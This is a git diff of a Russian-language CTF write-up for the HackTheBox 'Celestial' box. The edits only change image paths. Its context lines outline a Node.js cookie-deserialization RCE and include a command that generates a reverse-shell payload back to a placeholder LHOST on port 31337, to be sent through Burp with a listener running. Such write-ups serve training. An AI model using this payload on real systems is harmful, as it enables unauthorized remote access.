@@ -8,7 +8,7 @@ tags: [ctf, write-ups, boxes, hackthebox, Celestial, linux, express, node-js, rc
 comments: true
 ---
 
-[![celestial.png]({{ "/img/htb/boxes/celestial.png" | relative_url }})]({{ page.url }})
+[![celestial.png]({{ "/img/htb/boxes/celestial/celestial.png" | relative_url }})]({{ page.url }})
 
 **Celestial** — образцовый представитель типичной CTF-машины. Уязвимый web-сервис дает возможность удаленного выполнения кода (RCE), открывая путь к получению reverse-shell'а, откуда до повышения привилегий до суперпользователя (LPE) в силу небрежно выставленных настроек прав доступа рукой подать. Let's dive into it!
 
@@ -65,18 +65,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 ## Браузер
 Ради интереса посмотрим, что скажет браузер. При загрузке страницы в первый раз нас ждет просто сухой циничный маркер пустоты и безысходности, обличенный в жирные цифры **4**, **0**, **4**:
 
-[![celestial-port3000-browser-1.png]({{ "/img/htb/boxes/celestial-port3000-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-browser-1.png" | relative_url }})
+[![celestial-port3000-browser-1.png]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-1.png" | relative_url }})
 
 Если быть настойчивее и обновить страничку, нас встретит очень ценное замечание:
 
-[![celestial-port3000-browser-2.png]({{ "/img/htb/boxes/celestial-port3000-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-browser-2.png" | relative_url }})
+[![celestial-port3000-browser-2.png]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-browser-2.png" | relative_url }})
 
 Что-то здесь не так, потому что `2 + 2 is 4`, это я точно помню... Будем смотреть на запрос.
 
 ## Burp Suite
 Перехватим запрос и посмотрим, что под капотом:
 
-[![celestial-port3000-burp-1.png]({{ "/img/htb/boxes/celestial-port3000-burp-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-burp-1.png" | relative_url }})
+[![celestial-port3000-burp-1.png]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-1.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-1.png" | relative_url }})
 
 Cookie с профилем. Это объясняет, почему в первый раз пришло сообщение об ошибке (первый запрос был без печенек). Посмотрим, что представляет из себя значение профиля:
 ```text
@@ -138,7 +138,7 @@ root@kali:~# python node_shell.py -h <LHOST> -p 31337 -r -e -o
 
 Переводим в base64 и отправляем в Burp (не забыв при этом поднять слушателя на фоне на 31337 порт):
 
-[![celestial-port3000-burp-2.png]({{ "/img/htb/boxes/celestial-port3000-burp-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial-port3000-burp-2.png" | relative_url }})
+[![celestial-port3000-burp-2.png]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-2.png" | relative_url }})]({{ "/img/htb/boxes/celestial/celestial-port3000-burp-2.png" | relative_url }})
 
 # Внутри машины
 А тем временем:
